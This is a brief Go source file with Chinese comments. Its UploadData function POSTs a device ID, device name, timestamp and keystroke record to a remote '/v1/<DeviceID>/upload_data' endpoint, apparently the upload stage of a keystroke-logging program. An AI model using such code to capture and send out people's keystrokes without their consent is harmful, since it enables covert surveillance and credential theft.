package main

import (
	"errors"
	"read_db_upload/utilities"
)

type JSONStrut struct {
	DeviceID   string  `json:"device_id"`
	DeviceName string  `json:"device_name"`
	Data       KeyData `json:"data"`
}

type KeyData struct {
	Timestamp       int64  `json:"timestamp"`
	KeystrokeRecord string `json:"keystrokeRecord"`
}

// POST数据包，内容中三个字段，device_id, device_name, data
func UploadData(url string, data Data) error {
	//JSONValue, err := json.Marshal(data)
	//
	//values := map[string]io.Reader{
	//	"device_id":   strings.NewReader(DeviceID),
	//	"device_name": strings.NewReader(DeviceName),
	//	"data":        strings.NewReader(string(JSONValue)),
	//}

	newJSON := &JSONStrut{}
	newJSON.DeviceID = DeviceID
	newJSON.DeviceName = DeviceName
	newJSON.Data.Timestamp = data.Timestamp
	newJSON.Data.KeystrokeRecord = data.KeystrokeRecord

	rsp := utilities.MyHttpPost(url+"/v1/"+DeviceID+"/upload_data", newJSON)
	if rsp == nil {
		return errors.New("上传失败，无回显")
	}
	return nil
}
